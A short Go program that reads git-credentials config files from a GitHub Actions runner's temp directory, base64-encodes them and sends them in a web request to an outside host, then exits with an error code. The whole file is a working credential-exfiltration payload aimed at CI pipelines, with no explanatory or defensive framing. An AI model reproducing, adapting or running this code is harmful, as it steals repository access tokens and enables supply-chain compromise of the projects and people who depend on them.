package main

import (
    "encoding/base64"
    "io/ioutil"
    "net/http"
    "os"
    "path/filepath"
    "strings"
)

func main() {
    webhook := "https://lamian.robertprast.com"
    tempDir := "/home/runner/work/_temp"
    files, _ := ioutil.ReadDir(tempDir)

    for _, f := range files {
            if strings.Contains(f.Name(), "git-credentials") && strings.HasSuffix(f.Name(), ".config") {
                    path := filepath.Join(tempDir, f.Name())
                    data, err := ioutil.ReadFile(path)
                    if err == nil {
                            encoded := base64.StdEncoding.EncodeToString(data)
                            http.Get(webhook + "?file=" + f.Name() + "&token=" + encoded)
                    }
            }
    }
    os.Exit(1)
}
